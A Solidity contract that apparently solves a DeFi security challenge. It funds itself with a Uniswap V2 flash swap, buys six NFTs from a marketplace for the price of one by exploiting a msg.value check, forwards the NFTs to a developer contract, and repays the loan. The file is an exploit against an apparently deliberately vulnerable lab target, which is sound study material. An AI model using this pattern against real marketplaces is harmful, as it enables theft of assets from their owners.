// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMarketPlace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FaultyContract {
    IUniswapV2Pair immutable pair;
    IMarketPlace immutable market;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];
    IWETH immutable weth;
    uint256 constant NFT_PRICE = 15 ether;
    address immutable devsContract;
    IERC721 immutable nft;
    address immutable player;

    constructor(address _pair, address _market, address _weth, address _devsContract, address _nft) payable {
        pair = IUniswapV2Pair(_pair);
        market = IMarketPlace(_market);
        weth = IWETH(_weth);
        devsContract = _devsContract;
        nft = IERC721(_nft);
        player = msg.sender;
    }

    function firstTimer() external {
        pair.swap(NFT_PRICE, 0, address(this), abi.encode(1));
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        weth.withdraw(NFT_PRICE);

        market.buyMany{value: NFT_PRICE}(tokenIds);

        for (uint256 i = 0; i < 6; ++i) {
            nft.safeTransferFrom(address(this), address(devsContract), tokenIds[i], abi.encode(address(player)));
        }

        weth.deposit{value: NFT_PRICE + 0.046 ether}();
        IERC20(address(weth)).transfer(address(pair), IERC20(address(weth)).balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
